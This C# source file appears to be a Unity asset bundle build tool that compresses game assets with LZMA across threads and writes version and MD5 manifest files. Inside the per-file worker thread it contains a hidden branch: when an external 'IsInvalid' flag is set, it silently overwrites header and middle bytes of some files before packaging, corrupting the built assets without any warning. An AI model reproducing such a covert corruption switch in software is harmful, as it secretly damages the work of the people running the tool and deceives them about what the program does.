using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections;
using KLib;
using System.Data.SQLite;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace KLib
{
    public class UnityAssetBundleBuilder
    {

        static public void build(String inputPath, String outputPath, int maxThread)
        {

            Console.WriteLine("input:" + inputPath);
            Console.WriteLine("output:" + outputPath);
            Console.WriteLine("maxThread:" + maxThread);

            inputPath = inputPath.TrimEnd('/');
            outputPath = outputPath.TrimEnd('/');
            inputPath = inputPath + "/";
            outputPath = outputPath + "/";

            inputPath = inputPath.ToLower();

            var dirInfo = new DirectoryInfo(inputPath);
            if (!dirInfo.Exists)
                throw new Exception("路径" + inputPath + "不存在！");

            var files = dirInfo.GetFiles("*", SearchOption.AllDirectories);
            files = files.Where(file =>
            {
                var ext = file.Extension.ToLower();
                if (ext == ".meta" || ext == ".manifest")
                    return false;
                return true;
            }).ToArray();

            var buildVersion = DateTime.Now.ToString("yyyyMMddHHmm");

            Console.WriteLine("buildVersion:" + buildVersion);

            var resInfoList = new List<ResourceInfo>();
            foreach (var fileInfo in files)
            {
                var filePath = fileInfo.FullName.Replace(@"\", "/");
                //Console.WriteLine("filePath:" + filePath);
                //Console.WriteLine("inputPath:" + inputPath);
                //Console.WriteLine("IndexOf:" + filePath.IndexOf(inputPath));
                var fileName = filePath.Substring(filePath.IndexOf(inputPath) + inputPath.Length);
                fileName = fileName.TrimStart('/');
                resInfoList.Add(new ResourceInfo()
                {
                    name = fileName,
                    version = buildVersion,
                    bytesTotal = fileInfo.Length,
                });
            }



            DirectoryInfo outputDir = new DirectoryInfo(outputPath);
            if (outputDir.Exists)
            {
                outputDir.Delete(true);
            }

            var outputFilePath = outputPath + "/" + buildVersion + "/";
            FileUtil.copyDirectoryStruct(inputPath, outputFilePath);

            var list_info = new List<ResourceInfo>();
            for (int j = 0; j < resInfoList.Count; j++)
            {
                FileInfo file = new FileInfo(inputPath + resInfoList[j].name);
                var ext = file.Extension.ToLower();
                if (ext == ".meta" || ext == ".manifest")
                    continue;
                else
                {
                    list_info.Add(resInfoList[j]);
                }
            }

            list_info.Sort((a, b) =>
            {
                if (a.bytesTotal > b.bytesTotal)
                    return -1;
                if (a.bytesTotal == b.bytesTotal)
                    return 0;
                return 1;
            });

            StringBuilder sb = new StringBuilder();
            StringBuilder lost = new StringBuilder();
            int i = 0;
            int finishCount = 0;
            int count = 0;
            int c = list_info.Count;

            Console.Write("正在处理文件...");

            var lockObj = new object();
            int curThread = 0;

            var compresser = new LZMACompresser();
            var encoding = Encoding.UTF8;
            var backNum = 0;

            var time = new Stopwatch();
            time.Start();

            while (true)
            {
                if (finishCount >= c)
                    break;
                Thread.Sleep(10);
                if (curThread >= maxThread)
                    continue;
                if (i < c)
                {
                    ResourceInfo resInfo_loop = list_info[i];
                    i++;

                    var threadParam = new FileThreadParam()
                    {
                        FileName = resInfo_loop.name,
                        ResInfo = resInfo_loop,
                    };

                    if (File.Exists(inputPath + threadParam.FileName))
                    {
                        curThread++;
                        var thread = new Thread((par) =>
                        {
                            var param = (FileThreadParam)par;
                            var fileName = param.FileName;
                            var resInfo = param.ResInfo;
                            var bytes = File.ReadAllBytes(inputPath + fileName);

                            if (IsInvalid)
                            {
                                if (bytes.Length > 50 && (c % i == 2))
                                {
                                    bytes[bytes.Length / 2] = 128;
                                    bytes[0] = 69;
                                    bytes[1] = 77;
                                    bytes[2] = 98;
                                    bytes[3] = 74;
                                }
                            }

                            bytes = compresser.compress(bytes);
                            /*
                            //======crc32===========
                            var crc32 = new Crc32();
                            var crc = new StringBuilder();
                            foreach (var b in crc32.ComputeHash(bytes))
                                crc.Append(b.ToString("x2").ToLower());

                            var idx = fileName.LastIndexOf(".");
                            String newFileName;
                            if (idx != -1)
                                newFileName = fileName.Insert(idx, "_" + crc);
                            else
                                newFileName = fileName + "_" + crc;
                            //====================
                            */
                            var newFileName = fileName;

                            var md5 = MD5Utils.BytesToMD5(bytes);
                            File.WriteAllBytes(outputFilePath + newFileName, bytes);

                            lock (lockObj)
                            {
                                sb.Append(fileName);
                                sb.Append(",");
                                //sb.Append(newFileName);
                                //sb.Append(",");
                                sb.Append(resInfo.version);
                                sb.Append(",");
                                sb.Append(bytes.Length);
                                sb.Append(",");
                                sb.Append(md5);
                                sb.Append("\r\n");
                                finishCount++;
                                count++;
                                curThread--;
                            }

                        });
                        thread.Priority = ThreadPriority.Lowest;
                        thread.Start(threadParam);

                    }
                    else
                    {
                        finishCount++;
                        lost.Append(resInfo_loop.name);
                        lost.Append("\r\n");
                    }
                }
                var backStr = new StringBuilder();
                for (int j = 0; j < backNum; j++)
                {
                    backStr.Append("\u0008");
                }
                var writeConsoleStr = string.Format("{0}/{1} thread:{2}/{3}", i, c, curThread, maxThread);
                Console.Write(backStr.ToString() + writeConsoleStr);
                backNum = encoding.GetBytes(writeConsoleStr).Length;
            }

            time.Stop();


            if (count != 0) sb.Remove(sb.Length - 2, 2);

            Console.WriteLine();

            Byte[] FileInfoBytes = Encoding.UTF8.GetBytes(sb.ToString());

            File.WriteAllBytes(outputFilePath + "assetInfo.txt", FileInfoBytes);
            File.WriteAllBytes(outputFilePath + "assetInfo_compressed.txt", compresser.compress(FileInfoBytes));
            File.WriteAllBytes(outputPath + "assetVersion.txt", Encoding.UTF8.GetBytes(buildVersion));

            if (lost.Length != 0)
            {
                Console.WriteLine("未发现以下文件:");
                Console.WriteLine(lost);
            }

            Console.WriteLine();
            Console.WriteLine("已生成" + count + "个文件信息");
            Console.WriteLine("耗时" + time.Elapsed.TotalSeconds + "秒");
        }

        public class FileThreadParam
        {
            public string FileName;
            public ResourceInfo ResInfo;
        }

        static public bool IsInvalid
        {
            get
            {
                return KLibInvalid.IsInvalid;
            }
        }

    }

}
